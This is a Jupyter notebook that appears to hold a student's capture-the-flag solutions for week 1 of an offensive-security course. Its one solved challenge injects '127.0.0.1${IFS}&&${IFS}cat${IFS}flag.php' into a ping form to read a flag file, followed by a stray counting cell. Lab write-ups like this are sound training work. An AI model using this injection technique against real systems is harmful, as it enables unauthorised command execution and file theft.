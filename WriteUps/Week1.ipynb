{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "23f7b300",
   "metadata": {},
   "source": [
    "# OffSec Week1 -- Solutions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e53dcba3",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as req\n",
    "import re\n",
    "import base64"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cbd16c58",
   "metadata": {},
   "source": [
    "### CISCO [25 points]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "982d9807",
   "metadata": {},
   "source": [
    "Found a way to inject a sytem command to get the contents of the flag.php file.\n",
    "- Gave the ping-command a valid IP (loopback)\n",
    "- "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "360eaa28",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "flag{3}\n"
     ]
    }
   ],
   "source": [
    "url = 'http://hackfest.redrocket.club:31338/'\n",
    "\n",
    "payload = {'target':'127.0.0.1${IFS}&&${IFS}cat${IFS}flag.php'}\n",
    "\n",
    "res = req.get(url, params=payload)\n",
    "\n",
    "print('flag{' + re.search(r\"\\{([A-Za-z0-9_]+)\\}\", res.text).group(1) + '}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "b867418a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "000\n",
      "001\n",
      "002\n",
      "003\n",
      "004\n",
      "005\n",
      "006\n",
      "007\n",
      "008\n",
      "009\n"
     ]
    }
   ],
   "source": [
    "for i in range(10):\n",
    "    print('{:03d}'.format(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bfa45a55",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
